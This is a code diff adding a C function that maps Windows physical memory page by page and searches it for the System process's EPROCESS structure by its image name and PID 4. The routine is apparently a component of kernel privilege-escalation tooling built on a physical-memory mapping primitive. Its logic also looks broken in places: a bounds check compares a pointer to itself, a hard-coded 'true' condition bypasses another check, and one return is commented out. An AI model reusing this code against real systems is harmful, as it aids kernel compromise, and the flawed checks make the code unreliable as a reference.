@@ -175,3 +175,133 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 	free(buf);
 	return 0;
 }
+
+unsigned __int64 GetEPROCESSPhysicalBase(LPWSTR processName, unsigned int processID, HANDLE hPhysicalMemory) {
+	#define _EPROCESS_ImageFileName 0x5a8
+	int memRegionsCount = -1;
+	//UCHAR ImageFileName[15];
+	unsigned char pattern[16] = {
+		"System\0\0\0\0\0\0\0\0\0",
+	};
+	//UCHAR PriorityClass;
+	pattern[15] = 0x02;
+	unsigned int patternLength = 16;
+
+	memRegionsCount = GetPhysicalMemoryLayout(NULL);
+	if (memRegionsCount == -1) {
+		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
+		return -1;
+	}
+	MEMORY_REGION* memRegion = (MEMORY_REGION*)calloc(memRegionsCount, sizeof(MEMORY_REGION));
+	if (memRegion == NULL) {
+		fprintf(stderr, "[!] calloc() failed.\n");
+		return -1;
+	}
+	memRegionsCount = GetPhysicalMemoryLayout(memRegion);
+	if (memRegionsCount == -1) {
+		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
+		return -1;
+	}
+
+	printf("physical memory regions\n");
+	for (int i = 0; i < memRegionsCount; i++) {
+		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
+	}
+
+
+	PVOID* buf = (PVOID*)malloc(0x1000);
+	if (buf == 0) {
+		exit(EXIT_FAILURE);
+	}
+	PVOID* fourPages = (PVOID*)malloc(0x4000);
+	if (fourPages == 0) {
+		exit(EXIT_FAILURE);
+	}
+	// go through mapped physical memory regions
+	for (int i = 0; i < memRegionsCount; i++) {
+		unsigned __int64 start = memRegion[i].address;
+		unsigned __int64 end = memRegion[i].address + memRegion[i].size;
+		printf("%p - %p\n", (void*)start, (void*)end);
+		fflush(stdout);
+
+		// go through each page in memory region
+		for (unsigned __int64 page = start; page < end; page = page + 0x1000) {
+			if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page, 0x1000, buf) == FALSE) {
+				fprintf(stderr, "[!] MapPhysicalMemory failed");
+				return -1;
+			}
+			PVOID castedBuf = *buf;
+			int offset2 = 0;
+			// go through page byte by byte and search for pattern
+			for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++) {
+
+				offset2++;
+				castedBuf = (unsigned char*)castedBuf + 1;
+				if (memcmp(castedBuf, pattern, patternLength) == 0)
+				{
+					unsigned __int64 patternLocation = page + offset;
+					unsigned char* EPROCESSBaseOfSystem = (unsigned char*)castedBuf - 0x5A7;
+					unsigned char* UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
+					// check buf bounds
+					if ((unsigned __int64)buf <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)buf)
+					{
+						if (*((unsigned __int64*)UniqueProcessId) == 0x4)
+						{
+							void* physicalEPROCESSBase = (void*)(page + offset - 0x5A7);
+							printf("\nFound EPROCESS base of System at: %p\n", physicalEPROCESSBase);
+							return (unsigned __int64)physicalEPROCESSBase;
+						}
+					}
+					else
+					{
+						fprintf(stderr, "Struct does not fit into one page. Try mapping 4 pages.\n");
+
+						if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page - 0x2000, 0x4000, fourPages) == FALSE) {
+							fprintf(stderr, "[!] MapPhysicalMemory failed");
+							return -1;
+						}
+						patternLocation = page + offset;
+
+						// get middle of fourPages
+						PVOID castedFourPages = *fourPages;
+						castedFourPages = (unsigned char*)castedFourPages + 0x2000;
+
+						// now castedFourPages and *buf point to the same memory
+						printf("\nFound pattern at: %p\n", (void*)(page + offset));
+
+						// add pattern offset
+						castedFourPages = (unsigned char*)castedFourPages + offset;
+
+						EPROCESSBaseOfSystem = (unsigned char*)castedFourPages - 0x5A7;
+
+						UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
+						if (1 == 1 || (unsigned __int64)castedFourPages <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)castedFourPages)
+						{
+							printf("Struct does fit into four pages.\n");
+							if (*((unsigned __int64*)UniqueProcessId) == 0x4)
+							{
+								// PID of System is 4
+								void* physicalEPROCESSBase = (void*)(page + offset - 0x5A7);
+								printf("\nFound EPROCESS base of System at: %p\n", physicalEPROCESSBase);
+								//return (unsigned __int64)physicalEPROCESSBase;
+							}
+						}
+						else
+						{
+							fprintf(stderr, "Struct does not fit into four page.\n");
+						}
+					}
+
+				}
+			}
+			if (UnmapPhysicalMemory(buf) == FALSE) {
+				printf("UnmapPhysicalMemory failed");
+				return -1;
+			}
+		}
+	}
+	free(memRegion);
+	free(fourPages);
+	free(buf);
+	return 0;
+}
